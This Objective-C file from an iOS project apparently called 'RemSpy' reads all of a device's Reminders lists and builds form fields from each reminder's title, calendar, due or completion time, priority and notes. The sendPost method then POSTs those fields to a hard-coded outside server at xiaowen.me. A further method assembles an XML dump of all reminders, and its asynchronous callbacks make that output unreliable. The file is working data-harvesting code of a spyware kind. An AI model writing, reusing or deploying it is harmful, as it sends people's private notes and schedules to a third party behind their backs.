//
//  RemModel.m
//  RemSpy
//
//  Created by Zhang on 15/10/12.
//  Copyright (c) 2012 Zhang. All rights reserved.
//

#import "RemModel.h"

@interface RemModel(){
    EKEventStore *store;
    NSDateFormatter *formatter;
}

@end

@implementation RemModel
@synthesize delegate = _delegate;

- (id)initWithDelegate:(id)delegate
{
    self = [super init];
    self.delegate = delegate;
    store = [[EKEventStore alloc] init];
    if([EKEventStore authorizationStatusForEntityType:EKEntityTypeReminder] ==EKAuthorizationStatusNotDetermined){
        [store requestAccessToEntityType:EKEntityTypeReminder completion:^(BOOL granted, NSError *error) {
            NSLog(@"in request access...");
            store = [[EKEventStore alloc] init];
            [self.delegate remModelAccessHasBeenGranted];
        }];
    }else{
        
    }
    
    if (formatter == nil) {
        formatter = [[NSDateFormatter alloc] init];
        [formatter setDateStyle:NSDateFormatterMediumStyle];
        [formatter setTimeStyle:NSDateFormatterMediumStyle];
    }
    
    return self;
}

- (id)init
{
    self = [super init];
    store = [[EKEventStore alloc] init];
    if([EKEventStore authorizationStatusForEntityType:EKEntityTypeReminder] ==EKAuthorizationStatusNotDetermined){
        [store requestAccessToEntityType:EKEntityTypeReminder completion:^(BOOL granted, NSError *error) {
            
        }];
    }else{
        
    }
    
    if (formatter == nil) {
        formatter = [[NSDateFormatter alloc] init];
        [formatter setDateStyle:NSDateFormatterMediumStyle];
        [formatter setTimeStyle:NSDateFormatterMediumStyle];
    }
    
    return self;
}


- (NSArray *)retrieveAllRemindersLists
{
    return [store calendarsForEntityType:EKEntityTypeReminder];
}

- (void)retrieveRemindersFromList:(EKCalendar *)cal withCompletion:(void (^)(NSArray *))completion
{
    if([EKEventStore authorizationStatusForEntityType:EKEntityTypeReminder] == EKAuthorizationStatusAuthorized){
        [store requestAccessToEntityType:EKEntityTypeReminder completion:^(BOOL granted, NSError *error) {
            NSPredicate *predicate = [store predicateForRemindersInCalendars:[NSArray arrayWithObjects:cal, nil]];
            [store fetchRemindersMatchingPredicate:predicate completion:^(NSArray *reminders) {
                completion(reminders);
            }];
        }];
    }
}

- (void)sendReminders:(NSArray *)reminders WithCallback:(void (^)(void))callback
{
    EKReminder *reminder;
    NSMutableArray *encodedParam = [[NSMutableArray alloc]initWithCapacity:[reminders count]];
    NSDateFormatter *entireFormatter = [[NSDateFormatter alloc]init];
    [entireFormatter setDateFormat:@"dd-MM-YY HH:mm"];
    
    
    for ( int i = 0; i < [reminders count]; i++ )
    {
        reminder = reminders[i];
        NSString *time;
        
        if (reminder.isCompleted) {
           time = [NSString stringWithFormat:@" / Finished : %@", [formatter stringFromDate:reminder.completionDate]];
        }else{
            if (reminder.dueDateComponents.year != 0) {
                time = [NSString stringWithFormat:@" / Due time : %@", [formatter stringFromDate:[[NSCalendar currentCalendar] dateFromComponents: reminder.dueDateComponents]]];
            }else{
                time = @"Due time : None";
            }
            
        }
        
        NSString * param1 = [NSString stringWithFormat:@"Reminder%d=%@%@%@",i
                             ,[reminder.title stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@" / Calendar : %@",reminder.calendar.title] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@"%@",time] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
        NSString * param2 = [NSString stringWithFormat:@"Detail%d=%@%@\n",i
                             ,[[NSString stringWithFormat:@"Priority : %d",reminder.priority] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@" / Notes : %@",reminder.notes] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
        
        [encodedParam addObject:param1];
        [encodedParam addObject:param2];
    }
    [self sendPost:encodedParam WithCallback:callback];
}

- (void)sendPost:(NSArray *)encodedParam WithCallback:(void (^)(void))callback
{
    NSString * post = [encodedParam componentsJoinedByString:@"&"];
    NSData * postData = [post dataUsingEncoding:NSASCIIStringEncoding];
    
    NSURL * url = [NSURL URLWithString:@"http://www.xiaowen.me/TX/contacts.php"];
    NSLog(@"%@", post);
    NSMutableURLRequest * request = [[NSMutableURLRequest alloc] initWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:postData];
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    
    NSURLConnection *theConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    if (theConnection) {
        callback();
    }else {
        
    }
}

- (NSString *)prepareText
{
    /*NSDateFormatter *entireFormatter = [[NSDateFormatter alloc]init];
    [entireFormatter setTimeStyle:NSDateFormatterFullStyle];
    [entireFormatter setDateStyle:NSDateFormatterFullStyle];*/
    
    XMLWriter* xmlWriter = [[XMLWriter alloc]init];
    
    // start writing XML elements
    [xmlWriter writeStartElement:@"Reminders"];
    
    NSArray *cals = [self retrieveAllRemindersLists];
    
    for(EKCalendar *calendar in cals){
        
        [xmlWriter writeStartElement:@"List"];
        
        [xmlWriter writeAttribute:@"title" value:calendar.title];
        [xmlWriter writeAttribute:@"color" value: [UIColor colorWithCGColor:calendar.CGColor].description];
        
        //only from today to distant future ... don't know how to use distant past
        NSPredicate *predicate = [store predicateForRemindersInCalendars:[NSArray arrayWithObjects:calendar, nil]];
        [store fetchRemindersMatchingPredicate:predicate completion:^(NSArray *events) {
            for(EKReminder *evt in events){
                [xmlWriter writeStartElement:@"Reminder"];
                
                [xmlWriter writeStartElement:@"Title"];
                [xmlWriter writeCharacters: evt.title];
                [xmlWriter writeEndElement];
                
                if (evt.dueDateComponents.year != 0) {
                    [xmlWriter writeStartElement:@"DueDate"];
                    [xmlWriter writeCharacters:[[NSCalendar currentCalendar] dateFromComponents: evt.dueDateComponents].description];
                    [xmlWriter writeEndElement];
                }
                
                [xmlWriter writeStartElement:@"Completed"];
                [xmlWriter writeCharacters: [NSString stringWithFormat:@"%d", evt.completed]];
                 [xmlWriter writeEndElement];
                
                [xmlWriter writeStartElement:@"CompletionDate"];
                [xmlWriter writeCharacters: evt.completionDate.description];
                [xmlWriter writeEndElement];
                
                [xmlWriter writeStartElement:@"Notes"];
                [xmlWriter writeCharacters: evt.notes];
                [xmlWriter writeEndElement];
                
                [xmlWriter writeStartElement:@"Location"];
                [xmlWriter writeCharacters: evt.location];
                [xmlWriter writeEndElement];
                
                [xmlWriter writeStartElement:@"Priority"];
                [xmlWriter writeCharacters: [NSString stringWithFormat:@"%d", evt.priority]];
                [xmlWriter writeEndElement];
                
                [xmlWriter writeEndElement];
            }

        }];
                
        
        [xmlWriter writeEndElement];
    }
    
    [xmlWriter writeEndElement];
    
    // get the resulting XML string
    NSString* xml = [xmlWriter toString];
    
    return xml;
}


@end
